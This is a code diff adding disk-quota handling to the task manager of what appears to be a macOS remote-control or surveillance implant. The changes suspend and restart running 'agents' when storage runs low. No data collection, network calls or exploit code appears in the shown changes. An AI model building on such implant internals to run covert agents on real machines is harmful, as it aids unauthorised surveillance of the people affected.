@@ -32,6 +32,7 @@
 #import "RCSMLogManager.h"
 #import "RCSMActions.h"
 #import "RCSMEvents.h"
+#import "RCSMDiskQuota.h"
 
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
@@ -98,7 +99,7 @@ static NSLock *gSyncLock                  = nil;
 {
   return self;
 }
-
+extern NSString *RCSGlobalQuotaReached;
 - (id)init
 {
   Class myClass = [self class];
@@ -142,6 +143,12 @@ static NSLock *gSyncLock                  = nil;
               mIsSyncing        = NO;
               
               sharedTaskManager = self;
+              
+              // Start to handle quota notification
+              [[NSNotificationCenter defaultCenter] addObserver:self 
+                                                       selector:@selector(quotaNotificationCallback:) 
+                                                           name:RCSGlobalQuotaReached 
+                                                         object:nil];
             }
         }
     }
@@ -637,6 +644,33 @@ static NSLock *gSyncLock                  = nil;
 #pragma mark Agents
 #pragma mark -
 
+// Receive quota exceded notification
+- (void)quotaNotificationCallback:(NSNotification*)aNotify
+{
+  NSNumber *action = (NSNumber*)[aNotify object];
+  
+  if (action)
+    {
+      // Quota exceded: suspend running agents
+      if ([action intValue] == 1)
+        {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"quota exceded suspend running agents");
+#endif
+          [self suspendAgents];
+        }
+        
+      // Quota disk available: restart suspended agents
+      if ([action intValue] == 0) 
+        {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"quota available restart suspended agents");
+#endif
+          [self restartAgents];
+        }
+    }
+}
+
 - (id)initAgent: (u_int)agentID
 {
   return FALSE;
@@ -645,6 +679,11 @@ static NSLock *gSyncLock                  = nil;
 - (BOOL)startAgent: (u_int)agentID
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
+  // Disable agent start on global quota exceded
+  if ([[RCSMDiskQuota sharedInstance] isQuotaReached] == YES)
+    return NO;
+    
   RCSMLogManager *_logManager  = [RCSMLogManager sharedInstance];
   
   NSMutableDictionary *agentConfiguration = nil;
@@ -1435,6 +1474,103 @@ static NSLock *gSyncLock                  = nil;
 
 - (BOOL)suspendAgent: (u_int)agentID
 {
+  return YES;
+}
+
+- (BOOL)restartAgents
+{
+  NSAutoreleasePool *outerPool    = [[NSAutoreleasePool alloc] init];
+  
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Restart suspended agents");
+#endif
+  
+  NSMutableDictionary *anObject;
+  
+  for (int i = 0; i < [mAgentsList count]; i++)
+    {
+      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+      
+      anObject = [mAgentsList objectAtIndex: i];
+      
+      [anObject retain];
+      
+      int agentID       = [[anObject objectForKey: @"agentID"] intValue];
+      NSString *status  = [[NSString alloc] initWithString: [anObject objectForKey: @"status"]];
+      
+#ifdef DEBUG_TASK_MANAGER
+      infoLog(@"Agent %d status %@", agentID, status);
+#endif
+
+      if ([status isEqualToString: AGENT_SUSPENDED] == TRUE)
+        {
+          [self startAgent:agentID];
+          
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Agent %d new status %@", agentID, status);
+#endif
+        }
+      
+      [status release];
+      [anObject release];
+      
+      [innerPool release];
+    }
+  
+  [outerPool release];
+  
+  return YES;
+}
+
+- (BOOL)suspendAgents
+{
+  NSAutoreleasePool *outerPool    = [[NSAutoreleasePool alloc] init];
+
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Suspend running agents");
+#endif
+
+  NSMutableDictionary *anObject;
+  
+  for (int i = 0; i < [mAgentsList count]; i++)
+    {
+      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+      
+      anObject = [mAgentsList objectAtIndex: i];
+      
+      [anObject retain];
+      
+      int agentID       = [[anObject objectForKey: @"agentID"] intValue];
+      NSString *status  = [[NSString alloc] initWithString: [anObject objectForKey: @"status"]];
+
+#ifdef DEBUG_TASK_MANAGER
+    infoLog(@"Agent %#x status %@", agentID, status);
+#endif
+
+      if ([status isEqualToString: AGENT_RUNNING] == TRUE)
+        {
+          [self stopAgent:agentID];
+          
+          while ([anObject objectForKey: @"status"] != AGENT_STOPPED)
+            {
+              usleep(5000);
+            }
+            
+          [anObject setObject: AGENT_SUSPENDED forKey: @"status"];
+          
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Agent %#x new status %@", agentID, status);
+#endif
+        }
+        
+      [status release];
+      [anObject release];
+      
+      [innerPool release];
+    }
+    
+  [outerPool release];
+  
   return YES;
 }
 
@@ -3080,6 +3216,15 @@ static NSLock *gSyncLock                  = nil;
         case EVENT_SYSLOG:
           break;
         case EVENT_QUOTA:
+          {
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"EVENT quota FOUND! Starting monitor Thread");
+#endif
+            RCSMEvents *events = [RCSMEvents sharedEvents];
+            [NSThread detachNewThreadSelector: @selector(eventQuota:)
+                                     toTarget: events
+                                   withObject: anObject];
+          }
           break;
         default:
 #ifdef DEBUG_TASK_MANAGER
